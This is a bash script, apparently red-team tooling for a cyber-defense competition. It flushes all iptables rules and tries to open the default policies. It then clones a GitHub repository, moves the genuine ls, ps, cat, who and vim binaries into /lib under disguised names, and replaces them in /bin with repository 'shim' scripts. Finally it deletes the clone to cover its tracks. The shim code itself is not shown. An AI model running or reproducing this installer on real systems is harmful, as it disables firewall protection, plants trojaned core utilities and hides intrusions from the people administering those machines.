#!/bin/bash

# Install packages that may not be present
# Replace 'apt' with the package manager of the target machine
apt install git
apt install vim

# Flush iptables to make sure github isn't blocked
iptables -F
iptables -t mangle -F
iptables -t nat -F
iptables -t filter -F

iptables -P OUTPUT ALLOW
iptables -P INPUT ALLOW
iptables -P FORWARD ALLOW

# Clone the repository
git clone https://github.com/shadow5229/CDT-Tools.git

# Or if you are hosting on a webserver, comment out the line above (git clone)
# and uncomment the following lines

# *** ADD WEBSERVER INSTALLTION HERE ***

# Make each script executable
chmod +x CDT-Tools/ls_shim/ls_new
chmod +x CDT-Tools/ps_shim/ps_new
chmod +x CDT-Tools/cat_shim/cat_new
chmod +x CDT-Tools/who_shim/who_new
chmod +x CDT-Tools/vim_shim/vim_new

# Make the owner root
chown -R root:root CDT-Tools

# Move "healthy" binaries out of /bin
mv /bin/ls /lib/module_ls
mv /bin/ps /lib/module_ps
mv /bin/cat /lib/module_cat
mv /bin/who /lib/module_who
mv /bin/vim /lib/module_vim

# Move the shim scripts into /bin with original names
mv CDT-Tools/ls_shim/ls_new /bin/ls
mv CDT-Tools/ps_shim/ps_new /bin/ps
mv CDT-Tools/cat_shim/cat_new /bin/cat
mv CDT-Tools/who_shim/who_new /bin/who
mv CDT-Tools/vim_shim/vim_new /bin/vim

# Cleanup the mess
rm -r CDT-Tools
